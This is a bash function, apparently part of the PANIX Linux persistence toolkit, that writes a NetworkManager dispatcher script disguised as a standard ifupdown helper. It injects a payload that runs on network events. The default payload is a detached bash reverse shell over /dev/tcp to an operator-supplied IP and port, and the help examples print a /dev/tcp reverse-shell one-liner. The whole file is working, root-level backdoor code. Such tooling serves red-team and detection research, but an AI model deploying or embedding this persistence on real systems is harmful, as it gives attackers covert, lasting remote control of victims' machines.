setup_network_manager() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local payload=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_network_manager() {
		echo "Usage: ./panix.sh --network-manager [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default NetworkManager settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom NetworkManager settings"
		echo "  --payload <payload>          Specify custom payload"
		echo "--help|-h                    Show this help message"
	}

	# Process options so that we know what payload to use
	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--payload )
				shift
				payload=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --network-manager --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --network-manager --custom --payload 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
				exit 0
				;;
			--help|-h)
				usage_network_manager
				exit 0
				;;
			* )
				echo "Invalid option for --network-manager: $1"
				echo "Try './panix.sh --network-manager --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --network-manager --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --network-manager --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --network-manager --help' for more information."
			exit 1
		fi
		payload="nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown"
	fi

	if [[ $custom -eq 1 ]]; then
		if [[ -z $payload ]]; then
			echo "Error: --payload must be specified when using --custom."
			echo "Try './panix.sh --network-manager --help' for more information."
			exit 1
		fi
	fi

	if ! command -v NetworkManager &>/dev/null; then
		echo "Error: NetworkManager is not installed or not in PATH."
		echo "You can install it with:"
		echo "sudo apt install network-manager"
		echo "sudo dnf/yum install NetworkManager"
		echo "sudo pacman -S networkmanager"
		echo ""
		echo "[!] Warning: If the package requires installation, the technique might not work out of the box, as NetworkManager might not be used by default!"
		exit 1
	fi

	if [[ ! -d /etc/NetworkManager/dispatcher.d/ ]]; then
		echo "Error: /etc/NetworkManager/dispatcher.d/ does not exist. NetworkManager is not configured."
		exit 1
	fi

	local dispatcher_file="/etc/NetworkManager/dispatcher.d/panix-dispatcher.sh"

	# Create the dispatcher file if it does not exist,
	# using a quoted heredoc to prevent variable expansion.
	if [[ ! -f $dispatcher_file ]]; then
		cat <<'EOF' > "$dispatcher_file"
#!/bin/sh -e

if [ "$2" = "connectivity-change" ]; then
	exit 0
fi

if [ -z "$1" ]; then
	echo "$0: called with no interface" 1>&2
	exit 1
fi

if [ -n "$IP4_NUM_ADDRESSES" ] && [ "$IP4_NUM_ADDRESSES" -gt 0 ]; then
	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet"
fi
if [ -n "$IP6_NUM_ADDRESSES" ] && [ "$IP6_NUM_ADDRESSES" -gt 0 ]; then
	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet6"
fi

# If we have a VPN connection ignore the underlying IP address(es)
if [ "$2" = "vpn-up" ] || [ "$2" = "vpn-down" ]; then
	ADDRESS_FAMILIES=""
fi

if [ -n "$VPN_IP4_NUM_ADDRESSES" ] && [ "$VPN_IP4_NUM_ADDRESSES" -gt 0 ]; then
	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet"
fi
if [ -n "$VPN_IP6_NUM_ADDRESSES" ] && [ "$VPN_IP6_NUM_ADDRESSES" -gt 0 ]; then
	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet6"
fi

# We're probably bringing the interface down.
[ -n "$ADDRESS_FAMILIES" ] || ADDRESS_FAMILIES="inet"

# Fake ifupdown environment
export IFACE="$1"
export LOGICAL="$1"
export METHOD="NetworkManager"
export VERBOSITY="0"

for i in $ADDRESS_FAMILIES; do
	export ADDRFAM="$i"

	# Run the right scripts
	case "$2" in
		up|vpn-up)
			export MODE="start"
			export PHASE="post-up"
			run-parts /etc/network/if-up.d
			;;
		down|vpn-down)
			export MODE="stop"
			export PHASE="post-down"
			run-parts /etc/network/if-post-down.d
			;;
		hostname|dhcp4-change|dhcp6-change)
			# Do nothing
			;;
		*)
			echo "$0: called with unknown action \`$2'" 1>&2
			exit 1
			;;
	esac
done

# Insert payload here:
__PAYLOAD_PLACEHOLDER__
EOF

		chmod +x "$dispatcher_file"
		echo "[+] Created new dispatcher file: $dispatcher_file"
	fi

	# Replace the placeholder with the actual payload if present.
	if grep -q "__PAYLOAD_PLACEHOLDER__" "$dispatcher_file"; then
		# Escape the payload for use in sed
		local escaped_payload
		escaped_payload=$(printf '%s\n' "$payload" | sed 's/[\/&]/\\&/g')
		sed -i "s/__PAYLOAD_PLACEHOLDER__/$escaped_payload/" "$dispatcher_file"
		echo "[+] Replaced payload placeholder with actual payload."
	else
		# If the file already exists and no placeholder is found,
		# check if the payload is already present.
		if grep -qF "$payload" "$dispatcher_file"; then
			echo "[+] Payload already exists in $dispatcher_file."
		else
			echo "[+] Adding payload to $dispatcher_file..."
			echo "$payload" >> "$dispatcher_file"
			chmod +x "$dispatcher_file"
			echo "[+] Payload added successfully."
		fi
	fi

	echo "[+] Using dispatcher file: $dispatcher_file"
}
